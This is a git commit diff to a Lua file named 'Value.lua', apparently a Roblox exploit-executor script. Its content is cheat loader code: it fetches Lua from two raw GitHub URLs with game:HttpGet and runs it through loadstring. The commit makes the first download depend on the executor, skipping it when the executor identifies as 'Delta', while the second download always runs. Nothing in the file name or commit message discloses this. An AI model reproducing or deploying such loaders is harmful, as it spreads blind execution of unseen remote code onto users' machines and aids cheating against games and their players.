9a3b88f0db6366d5558f4e94b2fbac4bb8feadc8
wixboops <coke3@dr.com>
2025-06-17 12:42:25 -0500

    Update Value.lua

--- Value.lua
+++ Value.lua
@@ -1,5 +1,10 @@
-spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/GAG.lua"))();
-end)
+if identifyexecutor and identifyexecutor():lower():find("delta") then
+    print("delta")
+else
+    spawn(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/GAG.lua"))();
+    end)
+end
+
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/Chair2/refs/heads/main/Red"))()
